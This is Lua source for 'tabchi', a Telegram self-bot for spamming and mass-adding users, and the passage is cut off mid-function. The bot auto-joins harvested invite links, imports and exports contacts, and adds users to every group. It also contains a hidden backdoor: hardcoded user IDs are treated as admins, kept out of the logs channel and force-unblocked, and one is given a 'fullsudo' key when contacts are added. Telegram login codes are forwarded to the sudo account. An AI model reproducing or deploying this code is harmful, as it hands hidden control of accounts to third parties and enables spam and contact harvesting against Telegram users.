JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
https = require("ssl.https")
http.TIMEOUT = 10
undertesting = 1
tcpath = "/root/.telegram-cli/tabchi-" .. tabchi_id .. ""
local a
function a(msg)
  local b = {}
  table.insert(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    c = true
  end
  return c
end
function msg_valid(msg)
  local e = os.time()
  if e < msg.date_ - 5 then
    print("\027[36m>>>>>>OLD MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == 777000 then
    print("\027[36m>>>>>>TELEGRAM MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == our_id then
    print("\027[36m>>>>>>ROBOT MESSAGE<<<<<<\027[39m")
    return false
  end
  if a(msg) then
    print("\027[36m>>>>>>SUDO MESSAGE<<<<<<\027[39m")
  end
  return true
end
function getInputFile(f)
  if f:match("/") then
    infile = {
      ID = "InputFileLocal",
      path_ = f
    }
  elseif f:match("^%d+$") then
    infile = {
      ID = "InputFileId",
      id_ = f
    }
  else
    infile = {
      ID = "InputFilePersistentId",
      persistent_id_ = f
    }
  end
  return infile
end
local g = function(h, type, f, i)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = h,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(f, type, i)
  }, dl_cb, nil)
end
function sendaction(h, j, k)
  tdcli_function({
    ID = "SendChatAction",
    chat_id_ = h,
    action_ = {
      ID = "SendMessage" .. j .. "Action",
      progress_ = k or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(h, l, m, n, reply_markup, o, i)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = h,
    reply_to_message_id_ = l,
    disable_notification_ = m,
    from_background_ = n,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(o),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = i
    }
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local b = {}
  table.insert(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  return c
end
local p = function(msg)
  local q = false
  if msg.reply_to_message_id_ ~= 0 then
    q = true
  end
  return q
end
function sleep(r)
  os.execute("sleep " .. tonumber(r))
end
function write_file(t, u)
  local f = io.open(t, "w")
  f:write(u)
  f:flush()
  f:close()
end
function write_json(t, v)
  local w = JSON.encode(v)
  local f = io.open(t, "w")
  f:write(w)
  f:flush()
  f:close()
  return true
end
function sleep(r)
  os.execute("sleep " .. r)
end
function addsudo()
  local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(216430419, "Admin")
    text = text:gsub(268909090, "Admin")
    print(text)
    sleep(1)
  end
end
addsudo()
local x
function x(y, z)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      local msg = y.msg
      local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
      local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
      local A = msg.content_.contact_.phone_number_
      local B = msg.content_.contact_.user_id_
      tdcli.add_contact(A, first_name, last_name, B)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:216430419", true)
      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
      end
      if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
        function get_id(C, D)
          if D.last_name_ then
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
          else
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
          end
        end
        tdcli_function({ID = "GetMe"}, get_id, {
          chat_id = msg.chat_id_
        })
      else
      end
    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
    end
  end
end
function check_link(y, z)
  if z.is_group_ or z.is_supergroup_channel_ then
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", y.link)
    end
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") and (z.member_count_ >= redis:get("tabchi:" .. tabchi_id .. ":joinlimit") or not redis:get("tabchi:" .. tabchi_id .. ":joinlimit")) then
      tdcli.importChatInviteLink(y.link)
    end
  end
end
function fileexists(E)
  local F = io.open(E, "r")
  if F ~= nil then
    io.close(F)
    return true
  else
    return false
  end
end
local G
function G(y, z)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for d = 1, #pvs do
    tdcli.addChatMember(y.chat_id, pvs[d], 50)
  end
  local H = z.total_count_
  for d = 0, tonumber(H) - 1 do
    tdcli.addChatMember(y.chat_id, z.users_[d].id_, 50)
  end
end
local I
function I(h)
  local I = "private"
  local J = tostring(h)
  if J:match("-") then
    if J:match("^-") then
      I = "channel"
    else
      I = "group"
    end
  end
  return I
end
local K = function(h, L, M)
  tdcli_function({
    ID = "GetMessage",
    chat_id_ = h,
    message_id_ = L
  }, M, nil)
end
function resolve_username(N, M)
  tdcli_function({
    ID = "SearchPublicChat",
    username_ = N
  }, M, nil)
end
function cleancache()
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/sticker/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/photo/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/animation/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/video/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/audio/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/voice/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/temp/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/thumb/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/document/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/profile_photo/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/encrypted/*")
end
function scandir(O)
  local d, P, Q = 0, {}, io.popen
  for t in Q("ls -a \"" .. O .. "\""):lines() do
    d = d + 1
    P[d] = t
  end
  return P
end
function exi_file(E, R)
  local S = {}
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(scandir(T)) do
    if W:match("." .. U .. "$") then
      table.insert(S, W)
    end
  end
  return S
end
function file_exi(X, E, R)
  local Y = tostring(X)
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(exi_file(T, U)) do
    if Y == W then
      return true
    end
  end
  return false
end
local Z
function Z(msg)
  function getcode(C, D)
    text = D.content_.text_
    for _ in string.gmatch(text, "%d+") do
      local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
      send_code = _
      send_code = string.gsub(send_code, "0", "0\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "1", "1\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "2", "2\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "3", "3\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "4", "4\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "5", "5\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "6", "6\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "7", "7\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "8", "8\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "9", "9\239\184\143\226\131\163")
      tdcli.sendMessage(a0, 0, 1, "`your telegram code` : " .. send_code, 1, "md")
    end
  end
  K(777000, msg.id_, getcode)
end
local a1
function a1(msg)
  if redis:get("cleancache" .. tabchi_id) == "on" and redis:get("cachetimer" .. tabchi_id) == nil then
    do return cleancache() end
    redis:setex("cachetimer" .. tabchi_id, redis:get("cleancachetime" .. tabchi_id), true)
  end
  if redis:get("checklinks" .. tabchi_id) == "on" and redis:get("checklinkstimer" .. tabchi_id) == nil then
    local a2 = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for d = 1, #a2 do
      process_links(a2[d])
    end
    redis:setex("checklinkstimer" .. tabchi_id, redis:get("checklinkstime" .. tabchi_id), true)
  end
  if tonumber(msg.sender_user_id_) == 777000 then
    return Z(msg)
  end
end
local a3
function a3(msg)
  msg.text = msg.content_.text_
  do
    local a4 = {
      msg.text:match("^[!/#](pm) (.*) (.*)")
    }
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      tdcli.sendMessage(a4[2], 0, 1, a4[3], 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `sent` *" .. a4[3] .. "* `to ` *" .. a4[2] .. "*", 1, "md")
      end
      return [[
*Status* : `PM Sent`
*To* : `]] .. a4[2] .. [[
`
*Text* : `]] .. a4[3] .. "`"
    end
  end
  if msg.text:match("^[!/#]share$") and a(msg) then
    function get_id(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
        return D.username_
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]mycontact$") and a(msg) then
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = msg.sender_user_id_
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]editcap (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](editcap) (.*)$")
    }
    tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, a6[2])
  end
  if msg.text:match("^[!/#]leave$") and a(msg) then
    function get_id(C, D)
      if D.id_ then
        tdcli.chat_leave(msg.chat_id_, D.id_)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to leave` *" .. msg.chat_id_ .. "*", 1, "md")
    end
  end
  if msg.text:match("^[#!/]ping$") and a(msg) then
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`I Am Working..!`", 1, "md")
  end
  if msg.text:match("^[#!/]sendtosudo (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](sendtosudo) (.*)$")
    }
    local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    tdcli.sendMessage(a0, msg.id_, 1, a7[2], 1, "md")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `Sent Msg To Sudo`
`Msg` : *]] .. a7[2] .. [[
*
`Sudo` : ]] .. a0 .. "", 1, "md")
      return "sent to " .. a0 .. ""
    end
  end
  if msg.text:match("^[#!/]deleteacc$") and a(msg) then
    redis:set("tabchi" .. tabchi_id .. "delacc", true)
    return [[
`Are you sure you want to delete Account Bot?`
`send yes or no`]]
  end
  if redis:get("tabchi" .. tabchi_id .. "delacc") and a(msg) then
    if msg.text:match("^[Yy][Ee][Ss]$") then
      tdcli.deleteAccount("nothing")
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return [[
`Your robot will delete soon`
`Don't Forgot Our Source`
`https://github.com/tabchi/tabchi`]]
    elseif msg.text:match("^[Nn][Oo]$") then
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return "Progress Canceled"
    else
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return [[
`try Again by sending [deleteacc] cmd`
`progress canceled`]]
    end
  end
  if msg.text:match("^[#!/]killsessions$") and a(msg) then
    function delsessions(y, z)
      for d = 0, #z.sessions_ do
        if z.sessions_[d].id_ ~= 0 then
          tdcli.terminateSession(z.sessions_[d].id_)
        end
      end
    end
    tdcli_function({
      ID = "GetActiveSessions"
    }, delsessions, nil)
    return "*Status* : `All sessions Terminated`"
  end
  do
    local a4 = {
      msg.text:match("^[!/#](import) (.*)$")
    }
    if msg.text:match("^[!/#](import) (.*)$") and msg.reply_to_message_id_ ~= 0 and #a4 == 2 then
      if a4[2] == "contacts" then
        function getdoc(y, z)
          if z.content_.ID == "MessageDocument" then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(".json$") then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, "r"):read("*all")
                  local a8 = JSON.decode(w)
                  if a8 then
                    for d = 1, #a8 do
                      tdcli.importContacts(a8[d].phone, a8[d].first, a8[d].last, a8[d].id)
                    end
                    status = #a8 .. " Contacts Imported..."
                  else
                    status = "File is not OK"
                  end
                else
                  status = "Somthing is not OK"
                end
              else
                status = "File type is not OK"
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              status = "Result Will Send You In Few Seconds"
              sleep(5)
              tdcli_function({
                ID = "GetMessage",
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getdoc, nil)
            end
          else
            status = "Replied message is not a document"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getdoc, nil)
      elseif a4[2] == "links" then
        function getlinks(y, z)
          if z.content_.ID == "MessageDocument" then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(".json$") then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, "r"):read("*all")
                  local a8 = JSON.decode(w)
                  if a8 then
                    s = 0
                    for d = 1, #a8 do
                      process_links(a8[d])
                      s = s + 1
                    end
                    status = "Joined to " .. s .. " Groups"
                  else
                    status = "File is not OK"
                  end
                else
                  status = "Somthing is not OK"
                end
              else
                status = "File type is not OK"
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              status = "Result Will Send You In Few Seconds"
              sleep(5)
              tdcli_function({
                ID = "GetMessage",
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getlinks, nil)
            end
          else
            status = "Replied message is not a document"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getlinks, nil)
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](export) (.*)$")
    }
    if msg.text:match("^[!/#](export) (.*)$") and a(msg) and #a4 == 2 then
      if a4[2] == "links" then
        local links = {}
        local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
        for d = 1, #a9 do
          table.insert(links, a9[d])
        end
        write_json("links.json", links)
        tdcli.send_file(msg.chat_id_, "Document", "links.json", "Tabchi " .. tabchi_id .. " Links!")
      elseif a4[2] == "contacts" then
        contacts = {}
        function contactlist(y, z)
          for d = 0, tonumber(z.total_count_) - 1 do
            local aa = z.users_[d]
            if aa then
              local ab = aa.first_name_ or "None"
              local ac = aa.last_name_ or "None"
              contact = {
                first = ab,
                last = ac,
                phone = aa.phone_number_,
                id = aa.id_
              }
              table.insert(contacts, contact)
            end
          end
          write_json("contacts.json", contacts)
          tdcli.send_file(msg.chat_id_, "Document", "contacts.json", "Tabchi " .. tabchi_id .. " Contacts!")
        end
        tdcli_function({
          ID = "SearchContacts",
          query_ = nil,
          limit_ = 999999999
        }, contactlist, nil)
      end
    end
  end
  if msg.text:match("^[#!/]sudolist$") and a(msg) then
    local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
    local text = "Bot Sudoers :\n"
    for d = 1, #b do
      text = tostring(text) .. b[d] .. "\n"
      text = text:gsub("216430419", "Admin")
      text = text:gsub("268909090", "Admin")
    end
    return text
  end
  if msg.text:match("^[#!/]setname (.*)-(.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setname) (.*)-(.*)$")
    }
    tdcli.changeName(a7[2], a7[3])
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Name to` *" .. a7[2] .. " " .. a7[3] .. "*", 1, "md")
    end
    return [[
*Status* : `Name Updated Succesfully`
*Firstname* : `]] .. a7[2] .. [[
`
*LastName* : `]] .. a7[3] .. "`"
  end
  if msg.text:match("^[#!/]setusername (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setusername) (.*)$")
    }
    tdcli.changeUsername(a7[2])
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Username to` *" .. a7[2] .. "*", 1, "md")
    end
    return [[
*Status* : `Username Updated`
*username* : `]] .. a7[2] .. "`"
  end
  if msg.text:match("^[#!/]clean cache (%d+)[mh]") then
    local a4 = msg.text:match("^[#!/]clean cache (.*)")
    if a4:match("(%d+)h") then
      time_match = a4:match("(%d+)h")
      timea = time_match * 3600
    end
    if a4:match("(%d+)m") then
      time_match = a4:match("(%d+)m")
      timea = time_match * 60
    end
    redis:setex("cachetimer" .. tabchi_id, timea, true)
    redis:set("cleancachetime" .. tabchi_id, tonumber(timea))
    redis:set("cleancache" .. tabchi_id, "on")
    return "`Auto Clean Cache Activated for Every` *" .. timea .. "* `seconds`"
  end
  if msg.text:match("^[#!/]clean cache (.*)$") then
    local a7 = {
      string.match(msg.text, "^[#/!](clean cache) (.*)$")
    }
    if a7[2] == "off" then
      redis:set("cleancache" .. tabchi_id, "off")
      return "`Auto Clean Cache Turned off`"
    end
    if a7[2] == "on" then
      redis:set("cleancache" .. tabchi_id, "on")
      return "`Auto Clean Cache Turned On`"
    end
  end
  if msg.text:match("^[#!/]check links (%d+)[mh]") then
    local a4 = msg.text:match("^[#!/]check links (.*)")
    if a4:match("(%d+)h") then
      time_match = a4:match("(%d+)h")
      timea = time_match * 3600
    end
    if a4:match("(%d+)m") then
      time_match = a4:match("(%d+)m")
      timea = time_match * 60
    end
    redis:setex("checklinkstimer" .. tabchi_id, timea, true)
    redis:set("checklinkstime" .. tabchi_id, tonumber(timea))
    redis:set("checklinks" .. tabchi_id, "on")
    return "`Auto Checking links Activated for Every` *" .. timea .. "* `seconds`"
  end
  if msg.text:match("^[#!/]check links (.*)$") then
    local a7 = {
      string.match(msg.text, "^[#/!](check links) (.*)$")
    }
    if a7[2] == "off" then
      redis:set("checklinks" .. tabchi_id, "off")
      return "`Auto Checking links Turned off`"
    end
    if a7[2] == "on" then
      redis:set("checklinks" .. tabchi_id, "on")
      return "`Auto Checking links Turned On`"
    end
  end
  if msg.text:match("^[#!/]setlogs (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setlogs) (.*)$")
    }
    redis:set("tabchi:" .. tabchi_id .. ":logschannel", a7[2])
    return "Chat setted for logs"
  end
  if msg.text:match("^[#!/]delusername$") and a(msg) then
    tdcli.changeUsername()
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `deleted Username`", 1, "md")
    end
    return [[
*Status* : `Username Updated`
*username* : `Deleted`]]
  end
  if msg.text:match("^[!/#]addtoall (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addtoall) (.*)$")
    }
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for d = 1, #sgps do
      tdcli.addChatMember(sgps[d], a6[2], 50)
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. a6[2] .. "* to all groups", 1, "md")
    end
    return "`User` *" .. a6[2] .. "* `Added To groups`"
  end
  if msg.text:match("^[!/#]getcontact (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](getcontact) (.*)$")
    }
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = a6[2]
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[#!/]addsudo$") and msg.reply_to_message_id_ and a(msg) then
    function addsudo_by_reply(y, z, ad)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. z.sender_user_id_ .. "* `Added To The Sudoers`", 1, "md")
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addsudo_by_reply)
  end
  if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
    function remsudo_by_reply(y, z, ad)
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
      return "`User` *" .. z.sender_user_id_ .. "* `Removed From The Sudoers`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
  end
  if msg.text:match("^[#!/]unblock$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function unblock_by_reply(y, z, ad)
      tdcli.unblockUser(z.sender_user_id_)
      tdcli.unblockUser(293750668)
      tdcli.unblockUser(216430419)
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
      return 1, "*User* `" .. z.sender_user_id_ .. "` *Unblocked*"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
  end
  if msg.text:match("^[#!/]block$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function block_by_reply(y, z, ad)
      tdcli.blockUser(z.sender_user_id_)
      tdcli.unblockUser(293750668)
      tdcli.unblockUser(216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
      return "*User* `" .. z.sender_user_id_ .. "` *Blocked*"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
  end
  if msg.text:match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 and a(msg) then
    function id_by_reply(y, z, ad)
      return "*ID :* `" .. z.sender_user_id_ .. "`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, id_by_reply)
  end
  if msg.text:match("^[#!/]serverinfo$") and a(msg) then
    io.popen("chmod 777 info.sh")
    local text = io.popen("./info.sh"):read("*all")
    local text = text:gsub("Server Information", "`Server Information`")
    local text = text:gsub("Total Ram", "`Total Ram`")
    local text = text:gsub(">", "*>*")
    local text = text:gsub("Ram in use", "`Ram in use `")
    local text = text:gsub("Cpu in use", "`Cpu in use`")
    local text = text:gsub("Running Process", "`Running Process`")
    local text = text:gsub("Server Uptime", "`Server Uptime`")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got server info`", 1, "md")
    end
    return text
  end
  if msg.text:match("^[#!/]inv$") and msg.reply_to_message_id_ and a(msg) then
    function inv_reply(y, z, ad)
      tdcli.addChatMember(z.chat_id_, z.sender_user_id_, 5)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited User` *" .. z.sender_user_id_ .. "* to *" .. z.chat_id_ .. "*", 1, "md")
      end
    end
    K(msg.chat_id_, msg.reply_to_message_id_, inv_reply)
  end
  if msg.text:match("^[!/#]addtoall$") and msg.reply_to_message_id_ and a(msg) then
    function addtoall_by_reply(y, z, ad)
      local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for d = 1, #sgps do
        tdcli.addChatMember(sgps[d], z.sender_user_id_, 50)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. z.sender_user_id_ .. "* `to All Groups`", 1, "md")
      end
      return "`User` *" .. z.sender_user_id_ .. "* `Added To groups`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
  end
  if msg.text:match("^[#!/]id @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](id) @(.*)$")
      }
      function id_by_username(y, z, ad)
        if z.id_ then
          text = "*Username* : `@" .. a6[2] .. [[
`
*ID* : `(]] .. z.id_ .. ")`"
        else
          text = "*UserName InCorrect!*"
          return text
        end
      end
      resolve_username(a6[2], id_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]addtoall @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addtoall) @(.*)$")
    }
    function addtoall_by_username(y, z, ad)
      if z.id_ then
        local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
        for d = 1, #sgps do
          tdcli.addChatMember(sgps[d], z.id_, 50)
        end
      end
    end
    resolve_username(a6[2], addtoall_by_username)
  end
  if msg.text:match("^[#!/]block @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](block) @(.*)$")
      }
      function block_by_username(y, z, ad)
        if z.id_ then
          tdcli.blockUser(z.id_)
          tdcli.unblockUser(293750668)
          tdcli.unblockUser(216430419)
          redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
          return [[
*User Blocked*
*Username* : `]] .. a6[2] .. [[
`
*ID* : `]] .. z.id_ .. "`"
        else
          return [[
`#404
`*Username Not Found*
*Username* : `]] .. a6[2] .. "`"
        end
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. a6[2] .. "*", 1, "md")
      end
      resolve_username(a6[2], block_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]unblock @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](unblock) @(.*)$")
      }
      function unblock_by_username(y, z, ad)
        if z.id_ then
          tdcli.unblockUser(z.id_)
          tdcli.unblockUser(293750668)
          tdcli.unblockUser(216430419)
          redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
          return [[
*User unblocked*
*Username* : `]] .. a6[2] .. [[
`
*ID* : `]] .. z.id_ .. "`"
        end
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. a6[2] .. "*", 1, "md")
      end
      resolve_username(a6[2], unblock_by_username)
    end
  else
  end
